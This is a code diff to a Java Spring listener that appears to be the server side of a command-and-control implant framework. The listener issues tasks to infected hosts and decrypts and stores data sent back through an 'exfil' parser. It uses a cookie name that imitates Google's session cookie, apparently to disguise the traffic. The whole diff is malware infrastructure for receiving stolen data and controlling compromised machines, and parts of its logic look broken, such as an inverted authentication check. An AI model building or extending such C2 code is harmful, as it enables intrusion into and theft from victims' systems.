@@ -88,40 +88,39 @@ public class ListenerApplication {
 			session sessionData;
 			System.out.println(requestData);
 
-			String nonce = idCookie.substring(0,12).replace("-","");
 
 			String currentKey;
-
-			byte[] rawPostData = Base64.getUrlDecoder().decode(requestData.replace("=","").getBytes());
-			byte[] decryptedData = sapi.decrypt(rawPostData,nonce.getBytes(),epc.encKey);
-
-			Hashtable xmlParsed = napi.xmlExfilToHashtable(new String(decryptedData));
-
 			//validate auth first
-			if (!xmlParsed.get("aKey").toString().equals(epc.passwd))
-			{
-				return "nah";	
-			}
 
 			if (!epc.sessionTable.keySet().contains(idCookie))
 			{
 				sessionData = new session();
-				sessionData.nonce = nonce;
+				sessionData.nonce = idCookie.substring(0,12).replace("-","");;
 				sessionData.tasks.add(napi.mkTask("autoLib","metadata",new String[]{}));
-
-				epc.sessionTable.put(idCookie, sessionData);
+				sessionData.encKey = napi.strand(32);
 				currentKey = epc.encKey;
 			}
 			else
 			{
 				sessionData = (session) epc.sessionTable.get(idCookie);
+				sessionData.nonce = napi.strand(12);
 				currentKey = sessionData.encKey;
+			}
+
+			System.out.println(currentKey);
+			System.out.println(sessionData.nonce);
+			byte[] rawPostData = Base64.getUrlDecoder().decode(requestData.replace("=","").getBytes());
+			byte[] decryptedData = sapi.decrypt(rawPostData,sessionData.nonce.getBytes(),currentKey);
+
+			Hashtable xmlParsed = napi.xmlExfilToHashtable(new String(decryptedData));
+
+			if (!xmlParsed.get("aKey").toString().equals(epc.passwd))
+			{
+				return "nah";	
 			}
 
 		
 			sessionData.cookie = napi.mkCookie(idCookie, epc.passwd);
-			sessionData.encKey = napi.strand(32);
-			sessionData.nonce =  napi.strand(12);
 			sessionData.lastSeen = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
 
 
@@ -135,7 +134,7 @@ public class ListenerApplication {
 				Base64.getEncoder().encode(
 					sapi.encrypt(
 						retrDoc.getBytes(),
-						nonce.getBytes(),
+						sessionData.nonce.getBytes(),
 						currentKey
 					)
 				)
@@ -143,9 +142,10 @@ public class ListenerApplication {
 		}
 
 		@PostMapping("/60001")
-		String data(@RequestBody noceboApiRequest requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+		String data(@RequestBody String requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
 			session sessionData;
+			System.out.println(requestData);
 
 			if (!epc.sessionTable.keySet().contains(idCookie))
 			{
@@ -154,24 +154,26 @@ public class ListenerApplication {
 			else
 			{
 				sessionData  = (session) epc.sessionTable.get(idCookie);
-				if (sessionData.cookie != authCookie)
+				if (sessionData.cookie.equals(authCookie))
 				{
 					return "nah";
 				}
 			}
-			
+
 			Hashtable xmlParsed = napi.xmlExfilToHashtable(
 				new String(
 					sapi.decrypt(
 						Base64.getUrlDecoder().decode(
-							requestData.data
+							requestData.replace("=","")
 						), 
 						sessionData.nonce.getBytes(),
-						epc.encKey
+						sessionData.encKey
 					)
 				)
 			);
 			
+			System.out.println(xmlParsed.toString());
+
 			sessionData.data.add(xmlParsed);
 
 			return "ok";
@@ -206,7 +208,21 @@ public class ListenerApplication {
 		String log()
 		{
 			//put authenticator in front
-			return epc.sessionTable.toString();
+			ArrayList data = new ArrayList();
+
+			for (int i=0; i<epc.sessionTable.size(); i++)
+			{
+				session sessionData = epc.sessionTable.get(i);
+				Hashtable sessionRepresentative = new Hashtable();
+
+				sessionRepresentative.put("tasks",sessionData.tasks.size());
+				sessionRepresentative.put("lastSeen",sessionData.lastSeen);
+				sessionRepresentative.put("data",sessionData.data);
+
+				data.add(sessionRepresentative.toString());
+			}
+
+			return data.toString();
 		}
 
 		//@RequestMapping("/auth")
@@ -224,16 +240,6 @@ public class ListenerApplication {
 			static String nonce = new String();
 		}
 	
-		static class noceboApiRequest
-		{
-			//static ArrayList<noceboApiRequest> Data = new ArrayList<noceboApiRequest>();
-	
-			String data;
-			noceboApiRequest(String data)
-			{
-				this.data = data;
-			}
-		}
 	
 		static class noceboApiCommand
 		{
